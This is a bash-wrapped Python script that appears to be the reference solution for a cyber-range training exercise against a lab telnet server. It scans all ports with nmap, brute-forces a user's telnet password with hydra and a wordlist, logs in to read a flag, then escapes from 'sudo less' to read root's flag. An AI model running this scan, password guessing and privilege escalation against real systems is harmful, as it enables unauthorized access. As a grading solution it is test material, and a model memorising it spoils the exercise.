#!/bin/bash
# Reference solution for the kypo-demo telnet ladder, run on the attacker
# (the client foothold, per the range's assumed-breach entry). The upstream
# training solutions are exercised for real: nmap -p- discovers the
# off-default telnet port, hydra guesses alice's password from the provided
# wordlist, the telnet login reads alice's flag, and the sudo-less GTFOBins
# escape reads root's flag through the planted sudoers rule. Emits SUBMIT
# lines per the behavioral-check contract; must score 1.0.
set -euo pipefail
python3 - <<'PY'
# the foothold is focal (python 3.8): telnetlib is present, annotations lazy
from __future__ import annotations

import re
import socket
import subprocess
import telnetlib
import time

SERVER = "192.168.20.5"

# the stack converges after boot: wait for the declared telnet surface
def wait_any_listener() -> None:
    deadline = time.time() + 240
    while time.time() < deadline:
        try:
            socket.create_connection((SERVER, 2323), timeout=3).close()
            return
        except OSError:
            time.sleep(5)
    raise SystemExit("the server's telnet surface never converged")

wait_any_listener()

# level 1: find the port (nmap -p-, the upstream solution verbatim)
scan = subprocess.run(
    ["nmap", "-p-", "-Pn", "-T4", SERVER],
    capture_output=True, text=True, timeout=600,
)
ports = [int(m) for m in re.findall(r"^(\d+)/tcp\s+open", scan.stdout, re.M)]
if not ports:
    raise SystemExit(f"nmap found nothing open: {scan.stdout[-300:]}")
port = ports[0]
print(f"SUBMIT find-telnet-port {port}")

# level 2: guess alice's password from the provided wordlist (hydra, the
# upstream solution; a telnetlib fallback keeps the chain honest about WHAT
# is proven, the guessable password, if hydra's telnet parser misfires)
password = None
hydra = subprocess.run(
    ["hydra", "-l", "alice", "-P", "/home/user/passlist.txt",
     "-s", str(port), "-t", "4", "-f", f"telnet://{SERVER}"],
    capture_output=True, text=True, timeout=600,
)
m = re.search(r"login:\s*alice\s+password:\s*(\S+)", hydra.stdout)
if m:
    password = m.group(1)
else:
    for candidate in open("/home/user/passlist.txt").read().split():
        try:
            probe = telnetlib.Telnet(SERVER, port, timeout=20)
            probe.read_until(b"login:", 30); probe.write(b"alice\n")
            probe.read_until(b"Password:", 30)
            probe.write(candidate.encode() + b"\n")
            idx, _, _ = probe.expect([rb"\$", rb"login:"], 20)
            probe.close()
            if idx == 0:
                password = candidate
                break
        except OSError:
            time.sleep(2)
if password is None:
    raise SystemExit("the wordlist guess never landed")
print(f"guessed password: {password}")

# level 3 + 4: telnet in as alice, read her flag, then the sudo-less escape
tn = telnetlib.Telnet(SERVER, port, timeout=30)
tn.read_until(b"login:", 60); tn.write(b"alice\n")
tn.read_until(b"Password:", 60); tn.write(password.encode() + b"\n")
tn.read_until(b"$", 60)
tn.write(b"export TERM=vt100\n"); tn.read_until(b"$", 30)

def read_sentineled(command: bytes) -> bytes | None:
    """Run a command between sentinels so pty redraw residue can never desync the read; returns the first 32-hex token between them."""
    # the sentinels are split in the typed command so the pty ECHO of the
    # command line can never satisfy the read; only the OUTPUT contains them
    tn.write(b'echo IRSTA""RT; ' + command + b'; echo IRE""ND\n')
    data = tn.read_until(b"IREND", 30)
    m = re.search(rb"IRSTART\r?\n([0-9a-f]{32})", data)
    return m.group(1) if m else None

flag = read_sentineled(b"cat /home/alice/flag.txt")
if not flag:
    raise SystemExit("alice's flag not readable")
print(f"SUBMIT telnet-user-flag {flag.decode()}")

# the GTFOBins escape: sudo less on the one permitted file, ! runs as root.
# The password prompt is matched exactly (never the command echo), and the
# whole dance retries once: pager timing over a scripted pty is the one
# genuinely racy step in the ladder.
root_flag = None
for attempt in range(2):
    tn.write(b"sudo /usr/bin/less /home/alice/flag.txt\n")
    idx, _, _ = tn.expect([rb"password for alice:"], 15)
    if idx == 0:
        tn.write(password.encode() + b"\n")
    time.sleep(3)  # less draws (vt100: no not-fully-functional stall)
    tn.write(b"!cat /root/flag.txt > /tmp/rootflag.out; chmod 644 /tmp/rootflag.out\n")
    time.sleep(2)
    tn.write(b"\n")  # less: "!done (press RETURN)"
    time.sleep(1)
    tn.write(b"q\n")
    tn.read_until(b"$", 30)
    time.sleep(1)
    root_flag = read_sentineled(b"cat /tmp/rootflag.out")
    if root_flag:
        break
    print(f"escape attempt {attempt + 1}: rootflag not readable yet")
if not root_flag:
    raise SystemExit("the escalation never read root's flag")
print(f"SUBMIT privesc-root-flag {root_flag.decode()}")
tn.close()
PY
